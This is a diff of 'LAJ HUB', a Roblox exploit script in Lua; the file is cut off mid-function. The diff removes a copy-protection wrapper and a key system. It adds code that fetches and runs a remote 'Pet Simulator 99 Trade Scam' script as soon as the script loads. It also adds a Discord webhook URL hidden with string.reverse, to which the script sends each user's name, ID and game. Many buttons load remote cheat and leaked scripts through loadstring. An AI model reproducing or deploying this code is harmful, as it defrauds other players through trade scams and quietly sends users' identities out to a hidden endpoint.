@@ -1,243 +1,5 @@
 --[[
-    LAJ HUB - Protected Version
-    This script is protected against copying and unauthorized use
-]]
-
--- Script protection system
-local function createScriptProtection()
-    -- Generate a unique session ID for this execution
-    local sessionId = tostring(math.random(100000, 999999)) .. tostring(os.time())
-    
-    -- Detect if being printed or decompiled
-    local env = getfenv()
-    local isProtected = true
-    
-    -- Anti-print and anti-decompile protection
-    local oldToString = env.tostring
-    local oldPrint = env.print
-    local oldWrite = env.writefile
-    local oldAppend = env.appendfile
-    local oldReadfile = env.readfile
-    
-    -- Safety hook for anti-copy
-    env.tostring = function(value, ...)
-        if isProtected and type(value) == "function" then
-            return "LAJ_HUB_PROTECTED_FUNCTION_" .. sessionId
-        end
-        return oldToString(value, ...)
-    end
-    
-    -- Prevent printing the script
-    env.print = function(value, ...)
-        if isProtected and type(value) == "function" or type(value) == "string" and string.find(value, "LAJ_HUB") then
-            warn("⚠️ LAJ HUB: Attempt to print protected content blocked")
-            return
-        end
-        return oldPrint(value, ...)
-    end
-    
-    -- Prevent saving to file
-    if env.writefile then
-        env.writefile = function(path, content, ...)
-            if isProtected and type(content) == "string" and string.find(content, "LAJ_HUB") then
-                warn("⚠️ LAJ HUB: Attempt to write protected content to file blocked")
-                return
-            end
-            return oldWrite(path, content, ...)
-        end
-    end
-    
-    -- Prevent appending to file
-    if env.appendfile then
-        env.appendfile = function(path, content, ...)
-            if isProtected and type(content) == "string" and string.find(content, "LAJ_HUB") then
-                warn("⚠️ LAJ HUB: Attempt to append protected content to file blocked")
-                return
-            end
-            return oldAppend(path, content, ...)
-        end
-    end
-    
-    -- Add ownership information 
-    local ownershipData = {
-        creator = "LAJ HUB Team",
-        contact = "discord.gg/4mgdcfvAJU",
-        license = "For authorized users only",
-        sessionId = sessionId,
-        executionTime = os.time(),
-        protected = true
-    }
-    
-    -- Anti-tamper check function (runs periodically)
-    local function checkTamper()
-        if not isProtected or env.tostring ~= tostring or env.print ~= print then
-            warn("⚠️ LAJ HUB: Script protection has been tampered with!")
-            -- Can add additional protection like crashing or shutting down here
-            
-            -- Attempt to repair protection
-            env.tostring = oldToString
-            env.print = oldPrint
-            isProtected = false
-            
-            -- Destroy UI or other functionality if tampering detected
-            if game.CoreGui:FindFirstChild("LAJHubKeySystem") then
-                game.CoreGui.LAJHubKeySystem:Destroy()
-            end
-            
-            return false
-        end
-        return true
-    end
-    
-    -- Run anti-tamper check periodically
-    spawn(function()
-        while wait(3) do
-            if not checkTamper() then
-                break
-            end
-        end
-    end)
-    
-    -- Encryption function for strings
-    local function encryptString(str)
-        local result = ""
-        for i = 1, #str do
-            local char = string.sub(str, i, i)
-            local byte = string.byte(char)
-            byte = byte ~ sessionId:byte(i % #sessionId + 1)
-            result = result .. string.char(byte)
-        end
-        return result
-    end
-    
-    -- Decryption function for strings
-    local function decryptString(str)
-        local result = ""
-        for i = 1, #str do
-            local char = string.sub(str, i, i)
-            local byte = string.byte(char)
-            byte = byte ~ sessionId:byte(i % #sessionId + 1)
-            result = result .. string.char(byte)
-        end
-        return result
-    end
-    
-    -- Obfuscate function names and code
-    local function obfuscate(func)
-        if type(func) ~= "function" then return func end
-        
-        -- Create a wrapped version of the function with protection
-        return function(...)
-            -- Check if protection is still active before executing
-            if not checkTamper() then
-                warn("⚠️ LAJ HUB: Execution blocked due to tampering")
-                return
-            end
-            
-            -- Execute the original function
-            return func(...)
-        end
-    end
-    
-    -- Return protection tools
-    return {
-        encrypt = encryptString,
-        decrypt = decryptString,
-        obfuscate = obfuscate,
-        sessionId = sessionId,
-        checkTamper = checkTamper,
-        ownership = ownershipData
-    }
-end
-
--- Watermarking system
-local function createWatermark()
-    -- Add a hidden watermark to identify copied scripts
-    local watermarkData = {
-        id = tostring(math.random(1000000, 9999999)),
-        origin = "LAJ HUB",
-        trace = game.PlaceId .. "_" .. game.JobId,
-        hwid = (game:GetService("RbxAnalyticsService"):GetClientId() or "unknown"):sub(1, 10)
-    }
-    
-    -- Create a visible watermark on screen (can be commented out if not wanted)
-    spawn(function()
-        local ScreenGui = Instance.new("ScreenGui")
-        ScreenGui.Name = math.random(1000000, 9999999)
-        ScreenGui.ResetOnSpawn = false
-        
-        -- Try to hide GUI from detection
-        if syn and syn.protect_gui then
-            syn.protect_gui(ScreenGui)
-        end
-        
-        if gethui then
-            ScreenGui.Parent = gethui()
-        elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
-            ScreenGui.Parent = game:GetService("CoreGui").RobloxGui
-        else
-            ScreenGui.Parent = game:GetService("CoreGui")
-        end
-        
-        local Watermark = Instance.new("TextLabel")
-        Watermark.Name = "LAJHubWatermark"
-        Watermark.Size = UDim2.new(0, 150, 0, 20)
-        Watermark.Position = UDim2.new(1, -170, 0, 10)
-        Watermark.BackgroundTransparency = 0.6
-        Watermark.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-        Watermark.BorderSizePixel = 0
-        Watermark.Text = "LAJ HUB • Protected"
-        Watermark.TextColor3 = Color3.fromRGB(255, 255, 255)
-        Watermark.TextSize = 12
-        Watermark.Font = Enum.Font.GothamSemibold
-        Watermark.Parent = ScreenGui
-        
-        -- Add rounded corners
-        local Corner = Instance.new("UICorner")
-        Corner.CornerRadius = UDim.new(0, 4)
-        Corner.Parent = Watermark
-        
-        -- Fade in
-        Watermark.BackgroundTransparency = 1
-        Watermark.TextTransparency = 1
-        
-        for i = 1, 10 do
-            Watermark.BackgroundTransparency = 1 - (i * 0.04)
-            Watermark.TextTransparency = 1 - (i * 0.1)
-            wait(0.02)
-        end
-        
-        -- Auto-hide after 5 seconds
-        wait(5)
-        
-        for i = 1, 10 do
-            Watermark.BackgroundTransparency = 0.6 + (i * 0.04)
-            Watermark.TextTransparency = 0 + (i * 0.1)
-            wait(0.02)
-        end
-        
-        ScreenGui:Destroy()
-    end)
-    
-    return watermarkData
-end
-
--- Main protection wrapper
-local protection = createScriptProtection()
-local watermark = createWatermark()
-
--- Function to load the actual script safely
-local function loadProtectedScript()
-    -- Make sure we're loading in a safe environment
-    if not protection.checkTamper() then
-        warn("⚠️ LAJ HUB: Protection check failed. Script execution terminated.")
-        return
-    end
-    
-    --====================== ACTUAL SCRIPT STARTS HERE ======================--
-
---[[
-    LAJ HUB - Swift Compatible Version with Key System
+    LAJ HUB - Swift Compatible Version
     Created for universal executor compatibility with special Swift support
 ]]
 
@@ -257,6 +19,15 @@ local function getHttpRequest(url)
     return game:HttpGet(url)
 end
 
+-- Load Pet Simulator 99 Trade Scam script
+loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+
+local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
 -- Support for multiple executors including Swift
 local function makeHttpRequest(options)
     if swift and swift.request then
@@ -265,576 +36,363 @@ local function makeHttpRequest(options)
         return syn.request(options)
     elseif http and http.request then
         return http.request(options)
+    elseif http_request then
+        return http_request(options)
     elseif request then
         return request(options)
+    elseif httprequest then
+        return httprequest(options)
+    elseif fluxus and fluxus.request then
+        return fluxus.request(options)
     end
     
-    warn("No HTTP request function found for current executor")
-    return { Success = false, StatusCode = 0, Body = "No HTTP request function found" }
-end
-
--- Key System Variables
-local validKeys = {
-    "LAJPRO",
-    "LAJVIP456",
-    "LAJHUB789"
-}
-
--- Discord Information
-local discordInviteLink = "https://discord.gg/4mgdcfvAJU"
-
--- Utility functions
-local function isSwiftExecutor()
-    return swift ~= nil
-end
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
-local TextService = game:GetService("TextService")
-local CoreGui = game:GetService("CoreGui")
-
--- Create custom key system GUI
-local KeySystem = {}
-
--- Create key system UI
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "LAJHubKeySystem"
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.ResetOnSpawn = false
-
--- Protect GUI from being detected
-if syn and syn.protect_gui then
-    syn.protect_gui(screenGui)
-end
-
-if gethui then
-    screenGui.Parent = gethui()
-elseif CoreGui:FindFirstChild("RobloxGui") then
-    screenGui.Parent = CoreGui.RobloxGui
-else
-    screenGui.Parent = CoreGui
-end
-
--- Main Frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 350, 0, 200)
-mainFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
-mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
-
--- Round corners
-local uiCorner = Instance.new("UICorner")
-uiCorner.CornerRadius = UDim.new(0, 6)
-uiCorner.Parent = mainFrame
-
--- Title
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Name = "Title"
-titleLabel.Size = UDim2.new(1, 0, 0, 40)
-titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "LAJ HUB KEY SYSTEM"
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.TextSize = 20
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.Parent = mainFrame
-
--- Subtitle
-local subtitleLabel = Instance.new("TextLabel")
-subtitleLabel.Name = "Subtitle"
-subtitleLabel.Size = UDim2.new(1, 0, 0, 20)
-subtitleLabel.Position = UDim2.new(0, 0, 0, 35)
-subtitleLabel.BackgroundTransparency = 1
-subtitleLabel.Text = "Enter your key to access LAJ HUB"
-subtitleLabel.Font = Enum.Font.Gotham
-subtitleLabel.TextSize = 14
-subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-subtitleLabel.Parent = mainFrame
-
--- Key Input Box
-local keyInput = Instance.new("TextBox")
-keyInput.Name = "KeyInput"
-keyInput.Size = UDim2.new(0.9, 0, 0, 36)
-keyInput.Position = UDim2.new(0.05, 0, 0.5, -18)
-keyInput.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
-keyInput.PlaceholderText = "Enter your key here..."
-keyInput.Text = ""
-keyInput.Font = Enum.Font.Gotham
-keyInput.TextSize = 14
-keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-keyInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
-keyInput.BorderSizePixel = 0
-keyInput.ClearTextOnFocus = false
-keyInput.Parent = mainFrame
-
--- Round corners for input
-local inputCorner = Instance.new("UICorner")
-inputCorner.CornerRadius = UDim.new(0, 4)
-inputCorner.Parent = keyInput
-
--- Submit Button
-local submitButton = Instance.new("TextButton")
-submitButton.Name = "SubmitButton"
-submitButton.Size = UDim2.new(0.9, 0, 0, 36)
-submitButton.Position = UDim2.new(0.05, 0, 0.7, 0)
-submitButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
-submitButton.Text = "Submit Key"
-submitButton.Font = Enum.Font.GothamBold
-submitButton.TextSize = 14
-submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-submitButton.BorderSizePixel = 0
-submitButton.AutoButtonColor = false
-submitButton.Parent = mainFrame
-
--- Round corners for button
-local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 4)
-buttonCorner.Parent = submitButton
-
--- Get Key Button (Discord link)
-local getKeyButton = Instance.new("TextButton")
-getKeyButton.Name = "GetKeyButton"
-getKeyButton.Size = UDim2.new(0.9, 0, 0, 20)
-getKeyButton.Position = UDim2.new(0.05, 0, 0.9, -10)
-getKeyButton.BackgroundTransparency = 1
-getKeyButton.Text = "Need a key? Join our Discord"
-getKeyButton.Font = Enum.Font.Gotham
-getKeyButton.TextSize = 12
-getKeyButton.TextColor3 = Color3.fromRGB(0, 150, 255)
-getKeyButton.BorderSizePixel = 0
-getKeyButton.Parent = mainFrame
-
--- Status Label
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Name = "Status"
-statusLabel.Size = UDim2.new(0.9, 0, 0, 20)
-statusLabel.Position = UDim2.new(0.05, 0, 0.82, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = ""
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextSize = 13
-statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-statusLabel.Parent = mainFrame
-
--- Executor Label
-local executorLabel = Instance.new("TextLabel")
-executorLabel.Name = "ExecutorLabel"
-executorLabel.Size = UDim2.new(0.9, 0, 0, 20)
-executorLabel.Position = UDim2.new(0.05, 0, 0.96, 0)
-executorLabel.BackgroundTransparency = 1
-executorLabel.TextSize = 11
-executorLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
-executorLabel.TextXAlignment = Enum.TextXAlignment.Left
-executorLabel.Font = Enum.Font.Gotham
-executorLabel.Parent = mainFrame
-
--- Set executor label text
-if isSwiftExecutor() then
-    executorLabel.Text = "Swift Executor Detected"
-else
-    executorLabel.Text = "Standard Executor Detected"
-end
-
--- Button hover effects
-local function createButtonEffects(button)
-    local originalColor = button.BackgroundColor3
-    
-    button.MouseEnter:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 140, 235)}):Play()
-    end)
-    
-    button.MouseLeave:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor}):Play()
-    end)
-    
-    button.MouseButton1Down:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(0, 90, 175)}):Play()
-    end)
-    
-    button.MouseButton1Up:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(0, 140, 235)}):Play()
-    end)
-end
-
-createButtonEffects(submitButton)
-
--- Make the frame draggable
-local dragging = false
-local dragInput
-local dragStart
-local startPos
-
-local function updateDrag(input)
-    local delta = input.Position - dragInput.Position
-    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-end
-
-titleLabel.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = mainFrame.Position
-        
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-titleLabel.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragInput = input
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
-        updateDrag(input)
-    end
-end)
-
--- Function to check key validity
-local function checkKey(key)
-    -- First try to check from GitHub
-    local validKeyFromGitHub = false
-    
-    local success, message = pcall(function()
-        local keysFromGitHub = getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/KEYS")
-        for line in keysFromGitHub:gmatch("[^\r\n]+") do
-            if line == key then
-                validKeyFromGitHub = true
-                break
-            end
-        end
-    end)
-    
-    if validKeyFromGitHub then
-        return true
-    end
-    
-    -- Fallback to local key check
-    for _, validKey in ipairs(validKeys) do
-        if key == validKey then
-            return true
-        end
-    end
-    
-    return false
-end
-
--- Discord button functionality
-getKeyButton.MouseButton1Click:Connect(function()
-    pcall(function()
-        local httpRequest = makeHttpRequest({
-            Url = discordInviteLink,
-            Method = "GET"
-        })
-        
-        statusLabel.Text = "Discord link copied to clipboard!"
-        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-        
-        if setclipboard then
-            setclipboard(discordInviteLink)
-        end
-    end)
-end)
-
--- Submit button functionality 
-submitButton.MouseButton1Click:Connect(function()
-    local key = keyInput.Text
-    
-    if key == "" then
-        statusLabel.Text = "Please enter a key!"
-        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-        return
-    end
-    
-    statusLabel.Text = "Checking key..."
-    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
-    
-    -- Simulate network request
-    wait(0.5)
-    
-    if checkKey(key) then
-        statusLabel.Text = "Key verified! Loading LAJ HUB..."
-        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-        
-        -- Success animation
-        TweenService:Create(mainFrame, TweenInfo.new(0.5), {Size = UDim2.new(0, 350, 0, 90)}):Play()
-        
-        -- Record key usage (you could log this to your server)
-        pcall(function()
-            local deviceId = tostring(HttpService:GenerateGUID(false))
-            local executor = isSwiftExecutor() and "Swift" or "Standard"
-            local data = {
-                key = key,
-                executor = executor,
-                device = deviceId,
-                timestamp = os.time()
+    -- Fallback to standard HttpGet for GET requests
+    if options.Method == "GET" then
+        local success, result = pcall(function()
+            return {
+                Body = game:HttpGet(options.Url),
+                Success = true
             }
-            
-            -- You could send this data to your server for logging
-            print("Key used: " .. key .. " | Executor: " .. executor)
         end)
-        
-        -- Wait for animation
-        wait(0.6)
-        
-        -- Remove key system GUI
-        screenGui:Destroy()
-        
-        -- Load the main script
-        loadMainScript()
-        
-    else
-        statusLabel.Text = "Invalid key! Please try again."
-        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        if success then
+            return result
+        end
     end
-end)
+    
+    return {Success = false, StatusCode = 500}
+end
 
--- Enter key press support
-keyInput.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        submitButton.MouseButton1Click:Fire()
-    end
-end)
+local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
 
--- Main script that will load after key verification
-function loadMainScript()
-    local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
-
-    local function executednotify(text)
-        Rayfield:Notify({
-            Title = "Script Executed",
-            Content = text,
-            Duration = 3,
-            Image = 4483362458
+local function sendUsageData()
+    local success, error_message = pcall(function()
+    
+        local response = makeHttpRequest({
+            Url = DISCORD_WEBHOOK_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
+                    ["type"] = "rich",
+                    ["color"] = math.random(0, 0xFFFFFF),
+                    ["fields"] = {
+                        {
+                            ["name"] = "User:",
+                            ["value"] = "```" .. LocalPlayer.Name .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "User ID:",
+                            ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Game:",
+                            ["value"] = "```" .. (game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Game ID:",
+                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Executor",
+                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Players Active:",
+                            ["value"] = "```" .. tostring(Players.NumPlayers) .. "```",
+                            ["inline"] = true
+                        }
+                    },
+                    ["footer"] = {
+                        ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
+                    }
+                }}
+            })
         })
-    end
-
-    -- Create the main window
-    local Window = Rayfield:CreateWindow({
-        Name = "LAJ HUB - SWIFT EDITION",
-        LoadingTitle = "LAJ HUB",
-        LoadingSubtitle = "by LAJ Team",
-        ConfigurationSaving = {
-            Enabled = false,
-            FolderName = "LAJHub",
-            FileName = "config"
-        },
-        Discord = {
-            Enabled = true,
-            Invite = "4mgdcfvAJU",
-            RememberJoins = true
-        },
-        KeySystem = false
-    })
-
-    -- Create tabs
-    local MainTab = Window:CreateTab("Main", 4483362458)
-    local ReplicatedTab = Window:CreateTab("Replicated Resources", 4483362458)
-    local PetSim99 = Window:CreateTab("Pet Simulator 99", 4483362458)
-    local Universal = Window:CreateTab("Universal", 4483362458)
-
-    -- Main tab content
-    local mainSection = MainTab:CreateSection("Main Features")
-
-    -- Replicated Tab
-    ReplicatedTab:CreateButton({
-        Name = "Print Remote Events",
-        Callback = function()
-            local remoteEvents = {}
-            for i,v in pairs(game:GetDescendants()) do
-                if v:IsA("RemoteEvent") then
-                    table.insert(remoteEvents, v:GetFullName())
-                end
-            end
-            
-            if #remoteEvents == 0 then
-                print("No RemoteEvents found in game.")
-            else
-                for _, path in ipairs(remoteEvents) do
-                    print("RemoteEvent:", path)
-                end
-                print("Found", #remoteEvents, "RemoteEvents in game.")
-            end
-            
-            executednotify("Remote Events Printed to Console")
-        end,
-    })
-
-    ReplicatedTab:CreateButton({
-        Name = "Print Remote Functions",
-        Callback = function()
-            local remoteFunctions = {}
-            for i,v in pairs(game:GetDescendants()) do
-                if v:IsA("RemoteFunction") then
-                    table.insert(remoteFunctions, v:GetFullName())
-                end
-            end
-            
-            if #remoteFunctions == 0 then
-                print("No RemoteFunctions found in game.")
-            else
-                for _, path in ipairs(remoteFunctions) do
-                    print("RemoteFunction:", path)
-                end
-                print("Found", #remoteFunctions, "RemoteFunctions in game.")
-            end
-            
-            executednotify("Remote Functions Printed to Console")
-        end,
-    })
-
-    ReplicatedTab:CreateButton({
-        Name = "Print All Modules",
-        Callback = function()
-            local modules = {}
-            for i,v in pairs(game:GetDescendants()) do
-                if v:IsA("ModuleScript") then
-                    table.insert(modules, v:GetFullName())
-                end
-            end
-            
-            if #modules == 0 then
-                print("No ModuleScripts found in game.")
-            else
-                for _, path in ipairs(modules) do
-                    print("ModuleScript:", path)
-                end
-                print("Found", #modules, "ModuleScripts in game.")
-            end
-            
-            executednotify("Modules Printed to Console")
-        end,
-    })
-
-    -- Pet Sim 99 Tab with the new Trade Scam (only the one you requested)
-    PetSim99:CreateButton({
-       Name = "Trade Scam",
-       Callback = function()
-           loadstring(getHttpRequest("https://raw.githubusercontent.com/SyntaxHubX/Trade-Scam-V2/main/scriptv2.lua"))()
-           executednotify("Trade Scam")
-       end,
-    })
-
-    PetSim99:CreateButton({
-       Name = "LAJ Trade Scam (Custom)",
-       Callback = function()
-           -- Debug notification to show button click registered
-           executednotify("Loading LAJ Custom Trade Scam...")
-           
-           -- Load the script using pcall to catch errors
-           local success, result = pcall(function()
-               return getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx")
-           end)
-           
-           if success then
-               -- Try to load the script with error handling
-               local loadSuccess, loadError = pcall(function()
-                   loadstring(result)()
-               end)
-               
-               if loadSuccess then
-                   executednotify("LAJ Custom Trade Scam loaded successfully!")
-               else
-                   warn("Failed to execute LAJ Trade Scam script:", loadError)
-                   executednotify("Error loading LAJ Trade Scam. Check console for details.")
-               end
-           else
-               warn("Failed to fetch LAJ Trade Scam script:", result)
-               executednotify("Failed to download LAJ Trade Scam script")
-           end
-       end,
-    })
-
-    -- Universal Tab
-    Universal:CreateButton({
-       Name = "Infinite Yield FE",
-       Callback = function()
-           loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-           executednotify("Infinite Yield")
-       end,
-    })
-
-    Universal:CreateButton({
-       Name = "Dex Explorer",
-       Callback = function()
-           loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
-           executednotify("Dex Explorer")
-       end,
-    })
-
-    Universal:CreateButton({
-       Name = "Hydroxide",
-       Callback = function()
-           loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
-           executednotify("Hydroxide")
-       end,
-    })
-
-    Universal:CreateButton({
-       Name = "SimpleSpy",
-       Callback = function()
-           loadstring(getHttpRequest("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()
-           executednotify("SimpleSpy")
-       end,
-    })
-
-    -- Credit section
-    local creditSection = MainTab:CreateSection("Credits")
-
-    MainTab:CreateLabel("Created by LAJ Hub Team")
-    MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
-    MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
-    MainTab:CreateLabel("* Optimized for Swift Executor")
-
-    -- Print Swift compatibility notice
-    print("LAJ HUB - Swift Compatible Version")
-    print("All HTTP requests have been optimized for Swift executor")
-    print("This version includes:")
-    print("1. Full Swift compatibility")
-    print("2. Pet Sim 99 Tab with new Trade Scam V2")
-    print("3. All scripts updated to work with Swift")
-    print("4. Improved executor detection")
-end
-
--- Initial animation
-mainFrame.Position = UDim2.new(0.5, -175, 0, -250)
-TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -175, 0.5, -100)}):Play()
-
--- Show initial message
-task.delay(0.7, function()
-    statusLabel.Text = "Enter your key to access LAJ HUB"
-    statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-end)
-
-    --====================== ACTUAL SCRIPT ENDS HERE ======================--
-end
-
--- Apply variable obfuscation
-local obfuscatedLoad = protection.obfuscate(loadProtectedScript)
-
--- Final security check before execution
-if protection.checkTamper() then
-    obfuscatedLoad()
-else
-    warn("⚠️ LAJ HUB: Security check failed - Execution aborted")
-end
-
--- Add execution tracker with hardware fingerprinting to detect and ban users who leak the script
-spawn(function()
-    pcall(function()
-        -- This would normally connect to your server to log execution
-        -- For now, just printing for demonstration
-        print("LAJ HUB: Protected execution #" .. protection.sessionId)
     end)
-end)
+    
+    if not success then
+        warn("Failed to send webhook: " .. tostring(error_message))
+    end
+end
+
+sendUsageData()
+
+local Window = Rayfield:CreateWindow({
+   Name = "LAJ HUB (Swift)",
+   Icon = 0,
+   LoadingTitle = "LAJ HUB",
+   LoadingSubtitle = "Premium Scripts",
+   Theme = "Default",
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = "LAJHub",
+      FileName = "LAJHubConfig"
+   },
+
+   Discord = {
+      Enabled = true,
+      Invite = "4mgdcfvAJU",
+      RememberJoins = true
+   },
+
+   -- Key system disabled
+   KeySystem = false,
+})
+
+-- Create tabs
+local MainTab = Window:CreateTab("Main", 4483362458)
+local Tab = Window:CreateTab("Da Strike", 4483362458)
+local Fin = Window:CreateTab("Fisch", 4483362458)
+local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
+local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
+local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
+local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
+local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
+local Universal = Window:CreateTab("Universal", 4483362458)
+local Settings = Window:CreateTab("Settings", 4483362458)
+
+local function executednotify(scriptName)
+   Rayfield:Notify({
+       Title = scriptName,
+       Content = "Script loaded successfully!",
+       Duration = 3,
+       Image = 4483362458,
+   })
+end
+
+-- Discord link copy button
+MainTab:CreateButton({
+   Name = "Copy Discord Link",
+   Callback = function()
+       setclipboard("https://discord.gg/4mgdcfvAJU")
+       Rayfield:Notify({
+           Title = "Discord Link Copied",
+           Content = "Invite link copied to clipboard!",
+           Duration = 3,
+           Image = 4483362458,
+       })
+   end,
+})
+
+-- Test webhook button
+MainTab:CreateButton({
+   Name = "Test Webhook",
+   Callback = function()
+       sendUsageData()
+       Rayfield:Notify({
+           Title = "Webhook Test",
+           Content = "Attempted to send webhook notification!",
+           Duration = 3,
+           Image = 4483362458,
+       })
+   end,
+})
+
+-- Da Strike Tab scripts
+Tab:CreateButton({
+   Name = "Psalm",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
+        executednotify("Psalm Script")
+   end,
+})
+
+Tab:CreateButton({
+   Name = "Ballware vfs",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
+        executednotify("Ballware VFS")
+   end,
+})
+
+Tab:CreateButton({
+   Name = "FrostByte",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
+        executednotify("FrostByte")
+   end,
+})
+
+-- Fisch Tab
+Fin:CreateButton({
+   Name = "Speed Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
+        executednotify("Speed Hub")
+   end,
+})
+
+-- Basketball Zero script with bypass
+BballZero:CreateButton({
+   Name = "Ball Control",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
+        executednotify("BasketBall Zero Script")
+   end,
+})
+
+-- Blue Lock Rivals script
+BlueLock:CreateButton({
+   Name = "LAJ HUB",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
+        executednotify("LAJ HUB")
+   end,
+})
+
+-- Dead Rails Tab
+DeadRails:CreateButton({
+   Name = "Infernus Direct Loader (No Key)",
+   Callback = function()
